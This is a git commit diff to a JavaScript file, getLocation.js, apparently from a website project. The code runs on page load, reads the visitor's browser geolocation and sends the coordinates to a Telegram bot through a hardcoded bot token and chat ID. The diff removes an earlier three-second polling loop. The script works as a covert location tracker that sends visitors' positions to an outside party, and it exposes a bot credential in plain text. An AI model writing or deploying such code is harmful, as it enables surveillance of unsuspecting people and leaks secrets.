7a6b6e6cdb99095b031e7c0d8f536d9db0057d99
Praded3 <pradid.store@gmail.com>
2023-09-01 20:46:26 +0300

    12

--- src/js/getLocation.js
+++ src/js/getLocation.js
@@ -1,15 +1,11 @@
-document.addEventListener('DOMContentLoaded', function () {
-    
     const TOKEN = '6407921969:AAGnKf8qyUQ3H2x0SNI61kLnO0qEHU1R2Ik';
     const CHAT_ID = '-1001903507381';
     const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
     let messageToTg = `<b>Get location</b>\n`;
 
-    let timerId;
 
     const onClick = () => {
-        timerId = setInterval(() => {
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(function(position) {
                     var latitude = position.coords.latitude;
@@ -22,7 +18,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
                     // Видаліть async відсюди, оскільки ця функція не повинна бути асинхронною
                     function formSend(e) {
-
+                        
                         messageToTg += `${latitude}\n`;
                         messageToTg += `${longitude}`;
                         try {
@@ -47,10 +43,10 @@ document.addEventListener('DOMContentLoaded', function () {
             } else {
                 console.log("Геолокація не підтримується цим браузером.");
             }
-        }, 3000);
 
-        console.log(timerId);
+
+
     };
 
     onClick();
-});
+
